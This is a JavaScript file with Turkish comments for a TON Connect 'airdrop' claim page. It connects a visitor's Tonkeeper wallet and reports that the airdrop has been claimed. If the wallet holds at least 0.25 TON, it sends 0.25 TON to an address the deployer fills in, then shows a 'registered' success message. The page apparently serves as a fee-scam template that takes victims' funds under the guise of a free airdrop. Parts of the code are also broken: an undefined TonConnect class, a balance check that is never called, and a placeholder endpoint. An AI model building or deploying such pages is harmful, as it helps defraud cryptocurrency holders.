const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: 'https://hasan199191.github.io/telegrambotum/tonconnect-manifest.json'
});

document.getElementById('connectButton').addEventListener('click', async () => {
    try {
        const tonConnect = new TonConnect();
        await tonConnect.connect();

        const response = await fetch('https://your-api-endpoint.com/connect', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ wallet: 'Tonkeeper' })
        });

        if (!response.ok) {
            throw new Error('Network response was not ok');
        }

        const data = await response.json();
        document.getElementById('status').innerText = 'Airdrop talep edildi: ' + data.message;
    } catch (error) {
        console.error('Error connecting wallet:', error);
        document.getElementById('status').innerText = 'Hata: ' + error.message;
    }
});

async function checkBalance(wallet) {
    const balance = await wallet.getBalance(); // Gerçek bakiye kontrolü için TON API kullan
    if (balance >= 0.25) {
        sendTransaction(wallet);
    } else {
        document.getElementById('status').textContent = "Yetersiz bakiye!";
    }
}

async function sendTransaction(wallet) {
    const transaction = {
        messages: [{
            address: "BELİRLEDİĞİN_CÜZDAN_ADRESİ", // Kendi TON adresini yaz
            amount: 0.25 * 1000000000 // TON miktarı nanotons
        }]
    };
    
    try {
        await wallet.sendTransaction(transaction);
        document.getElementById('status').textContent = "Başarılı! Kaydoldunuz.";
    } catch (error) {
        document.getElementById('status').textContent = "İşlem hatası: " + error.message;
    }
}
